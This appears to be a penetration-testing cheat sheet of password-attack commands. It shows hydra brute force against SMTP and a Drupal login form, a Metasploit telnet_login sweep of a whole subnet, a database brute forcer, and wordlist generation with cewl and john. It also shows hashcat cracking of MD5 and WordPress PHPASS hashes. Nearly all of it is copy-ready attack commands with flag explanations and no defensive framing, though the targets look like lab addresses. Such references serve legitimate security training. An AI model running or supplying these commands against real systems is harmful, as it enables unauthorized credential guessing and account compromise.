

## SMTP brute force
```
hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w 20 -f 192.168.29.55 smtp

-l LOGIN name
-P load several passwords from FILE
-s port
-v verbose mode
-V show login+pass combination for each attempt
-t run TASKS number of connects in parallel
-w waittime for responses (32s) / between connects per thread
-f exit after the first found login/password pair
```

## Telnet bruteforce
```
use auxiliary/scanner/telnet/telnet_login
msf auxiliary(telnet_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf auxiliary(telnet_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
msf auxiliary(telnet_login) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(telnet_login) > set THREADS 254
THREADS => 254
msf auxiliary(telnet_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf auxiliary(telnet_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(telnet_login) > run

msf auxiliary(telnet_login) > sessions -l  // to see the sessions that succeded
```

## MySql, Oracle, PostgreSQL, SQLlite, MS-Sql bruteforcer and database browser
```
hexorbase
```

## Generate a wordlist from a webpage
```
cewl www.megacorpone.com -m 6 -w /root/newfilelist.txt 2>/dev/null
```

## Mangle/permutate a wordlist with john
```
john --wordlist=cewlgeneratedwordlist.txt --rules --stdout > megamangled.txt
```

## Drupal bruteforce attack
```
site="192.168.230.147"
id=$(curl -s http://$site/user/|grep "form_build_id" |cut -d"\"" -f6)
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt $site http-form-post "/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry" -V
```

## Crack MD5 with hashcat and wordlist. a=0 is straight attack
```
oclHashcat64.exe -m 0 -a 0 C:\Users\Cristi\Downloads\hashuri.txt F:\wordlist\realuniq.lst
oclHashcat64.exe -m 0 -pw-max=8 C:\Users\Cristi\Downloads\hashuri.txt F:\wordlist\realuniq.lst
```

# Brute force Wordpress (PHPASS)
```
cudahashcat64.exe -m 400 -a 3 hashfile wordlist
```
